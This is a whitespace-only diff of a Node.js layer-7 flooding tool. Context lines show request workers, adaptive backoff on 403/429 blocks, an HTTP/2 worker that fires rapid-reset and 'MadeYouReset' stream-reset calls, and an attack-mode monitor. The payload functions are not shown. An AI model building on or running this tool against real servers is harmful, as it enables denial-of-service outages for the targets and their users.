@@ -227,13 +227,13 @@ async function runStandardWorker(workerId, client, protocolKey) {
             const latencyMs = (diff[0] * 1e9 + diff[1]) / 1e6;
             stats.responsesReceived++;
             stats.totalLatency += latencyMs;
-            
+
             const pStats = stats.protocolStats[protocolKey];
             pStats.responses++;
             pStats.statuses[statusCode] = (pStats.statuses[statusCode] || 0) + 1;
 
             lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.green(statusCode)} (${chalk.yellow(latencyMs.toFixed(2) + 'ms')})`);
-            
+
             if (argv.adaptiveDelay) {
                 switch (statusCode) {
                     case 401: case 403: case 429: case 431: case 451:
@@ -258,7 +258,7 @@ async function runStandardWorker(workerId, client, protocolKey) {
             scheduleNext();
         }
     };
-    
+
     const scheduleNext = () => {
         if (!isRunning) return;
         requestsInBurst++;
@@ -270,7 +270,7 @@ async function runStandardWorker(workerId, client, protocolKey) {
             setImmediate(sendRequest);
         }
     };
-    
+
     sendRequest();
 }
 
@@ -293,7 +293,7 @@ function startHttp2AttackWorker() {
     client.on('close', reconnect);
 
     client.on('connect', () => {
-        for (let i = 0; i < 20; i++) { 
+        for (let i = 0; i < 20; i++) {
             if (attackMode === 'rapid-reset') sendRapidReset(client);
             if (attackMode === 'madeyoureset') sendMadeYouReset(client);
         }
@@ -372,7 +372,7 @@ function updateMonitor() {
     console.log(chalk.cyan('--------------------------------------------'));
     console.log(chalk.cyan.bold('          ⚡️ PV NodeJS Layer 7 ⚡️         '));
     console.log(chalk.cyan('--------------------------------------------'));
-    
+
     if (attackMode !== 'none') {
         // Keep original vertical layout for attack mode
         console.log(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
@@ -401,7 +401,7 @@ function updateMonitor() {
         rightColumn.push(chalk.white.bold('Total Responses Rcvd: ') + chalk.blue(stats.responsesReceived));
         rightColumn.push(chalk.white.bold('Requests/Second: ') + chalk.magenta(rps));
         rightColumn.push(chalk.white.bold('Avg Latency: ') + chalk.yellow(`${avgLatency} ms`));
-        
+
         const maxLeftLength = Math.max(...leftColumn.map(line => stripAnsi(line).length));
         const padding = 5;
 
@@ -416,7 +416,7 @@ function updateMonitor() {
 
     console.log('');
     console.log(chalk.white.bold('Response Status Counts:'));
-    
+
     if (attackMode !== 'none') {
         const sortedAttackStatuses = Object.keys(stats.statusCounts).sort();
         if (sortedAttackStatuses.length === 0) {
@@ -438,7 +438,7 @@ function updateMonitor() {
             });
 
             const sortedStatuses = Array.from(allStatusCodes).sort((a, b) => b - a);
-            
+
             if (sortedStatuses.length === 0) {
                  console.log(chalk.gray('  (waiting for responses...)'));
             } else {
@@ -472,7 +472,7 @@ function updateMonitor() {
             }
         }
     }
-    
+
     console.log('');
     const logsToShow = attackMode !== 'none' ? lastAttackLogs : lastLogs;
     const logTitle = attackMode !== 'none' ? 'Attack Log' : 'Request Log';
@@ -542,7 +542,7 @@ async function main() {
     } else {
         workerCounts['h2'] = concurrency;
     }
-    
+
     let workerId = 0;
     for (const protocolKey in workerCounts) {
         const count = workerCounts[protocolKey];
